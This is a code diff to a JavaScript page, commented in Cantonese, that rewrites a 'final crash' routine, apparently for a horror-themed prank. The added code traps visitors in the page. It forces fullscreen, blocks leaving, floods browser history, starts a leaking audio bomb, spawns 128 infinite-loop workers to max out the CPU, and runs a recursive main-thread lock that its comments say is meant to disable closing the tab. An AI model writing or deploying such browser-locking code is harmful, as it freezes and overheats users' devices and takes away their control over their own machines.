@@ -107,68 +107,69 @@ setTimeout(() => {
     }, 16); // ~60fps
 }, 25000); // 25秒後開始獵殺
 
-// 3. 核心：跨平台終極封鎖 (The "I'm Cooked" Code)
+// --- 核心：跨平台終極封鎖 (The "Absolute Lock" Edit) ---
 function triggerFinalCrash() {
     if (systemCrashed) return;
     systemCrashed = true;
 
-    // A. 攔截所有退出動作 (PC/Mac)
-    window.onbeforeunload = () => "STAY WITH ME.";
+    // 1. 攔截退出 (PC/Mac)
+    window.onbeforeunload = () => "SYSTEM ERROR: DATA CORRUPTED.";
     
-    // B. 全屏紅色地獄 (隱藏所有 UI)
+    // 2. 即時切換畫面 (確保死機前畫面已經變咗)
     document.body.innerHTML = `
         <div id="death-screen" style="background:black; color:red; width:100vw; height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; position:fixed; top:0; left:0; z-index:9999999; cursor:none; overflow:hidden;">
-            <h1 style="font-size:18vw; font-family:serif; text-shadow:0 0 40px red; margin:0;">HELP ME.</h1>
-            <p style="font-size:2vw; color:white; opacity:0.5;"></p>
+            <h1 style="font-size:18vw; font-family:serif; text-shadow:0 0 40px red; margin:0; animation: shake 0.1s infinite;">HELP ME.</h1>
+            <p style="font-size:2vw; color:white; opacity:0.5; font-family:monospace;">RYUGYONG-26 FATAL EXCEPTION AT 0x00444</p>
+            <style>
+                @keyframes shake { 0%{transform:translate(2px,2px);} 50%{transform:translate(-2px,-2px);} 100%{transform:translate(2px,-2px);} }
+            </style>
         </div>
     `;
 
-    // C. 請求全屏 (隱藏瀏覽器標籤)
+    // 3. 請求全屏 (隱藏 UI)
     const el = document.documentElement;
     if (el.requestFullscreen) el.requestFullscreen();
     else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
 
-    // D. 系統資源爆破 (搶佔 CPU/RAM/GPU)
+    // 4. 啟動音頻炸彈
+    const crashAudio = new (window.AudioContext || window.webkitAudioContext)();
+    setInterval(() => {
+        let osc = crashAudio.createOscillator();
+        osc.type = 'sawtooth';
+        osc.frequency.setValueAtTime(50 + Math.random() * 5000, crashAudio.currentTime);
+        osc.connect(crashAudio.destination);
+        osc.start();
+        // 唔 close osc，等佢內存溢出
+    }, 30);
+
+    // 5. 執行「絕對封鎖」
     setTimeout(() => {
-        // 1. 強制震動 (Android 手機)
-        if (navigator.vibrate) navigator.vibrate([1000, 500, 1000, 500, 2000]);
-
-        // 2. 音頻過載炸彈
-        const crashAudio = new (window.AudioContext || window.webkitAudioContext)();
-        setInterval(() => {
-            let osc = crashAudio.createOscillator();
-            osc.type = 'sawtooth';
-            osc.frequency.setValueAtTime(Math.random() * 8000, crashAudio.currentTime);
-            osc.connect(crashAudio.destination);
-            osc.start();
-        }, 50);
-
-        // 3. 核心鎖死：DOM 爆炸 + 歷史記錄劫持
-        function absoluteLock() {
-            // 劫持 Mobile 的「返回手勢」
-            for (let i = 0; i < 200; i++) {
-                history.pushState(null, null, "#" + Math.random());
-            }
-
-            // GPU 渲染壓迫：建立大量模糊層，讓手機螢幕完全反應不到
-            const layer = document.createElement('div');
-            layer.style.cssText = `position:fixed; top:0; left:0; width:1vw; height:1vw; backdrop-filter:blur(50px); z-index:10;`;
-            document.getElementById('death-screen').appendChild(layer);
-
-            // CPU 同步阻塞：處理超大對象
-            const heavy = new Array(500000).fill("NORTH_KOREA_HACKER").join("!!");
-            JSON.stringify(heavy);
-
-            setTimeout(absoluteLock, 0); // 0延遲遞迴，確保主線程無喘息機會
+        // A. 歷史記錄洪水 (令 Back/Forward 掣失效)
+        for (let i = 0; i < 500; i++) {
+            history.pushState(null, null, "#FATAL_ERROR_" + Math.random());
         }
 
-        // 4. 開啟 64 個背景 Worker (殺死所有 CPU 核心)
+        // B. 開啟 128 個 Worker 搶佔所有 CPU 核心 (背景壓力)
         const workerBlob = new Blob([`while(true){ postMessage(Math.random()); }`], {type: 'text/javascript'});
         const workerUrl = URL.createObjectURL(workerBlob);
-        for (let i = 0; i < 64; i++) { new Worker(workerUrl); }
+        for (let i = 0; i < 128; i++) { new Worker(workerUrl); }
 
-        absoluteLock();
-    }, 100);
+        // C. 核心：同步主線程鎖死 (這是讓「X」掣失靈的關鍵)
+        // 使用 Promise 微任務不斷自我複製，搶佔 UI Thread 的所有 Tick
+        function killUIThread() {
+            // 同步循環：在這一毫秒內完全不交出控制權
+            const start = Date.now();
+            while (Date.now() - start < 500) { 
+                // 進行超重型運算，確保 CPU 溫度飆升
+                Math.sqrt(Math.random() * 10000000); 
+                JSON.stringify(new Array(10000).fill("REBEL"));
+            }
+            // 遞迴調用微任務，確保瀏覽器沒時間處理「點擊 X 掣」的事件
+            Promise.resolve().then(killUIThread);
+        }
+
+        killUIThread();
+    }, 50); // 畀 50ms 畫面渲染 HELP ME
 }
 
 // 4. 輸入與控制邏輯 (PC + Mobile 通用)
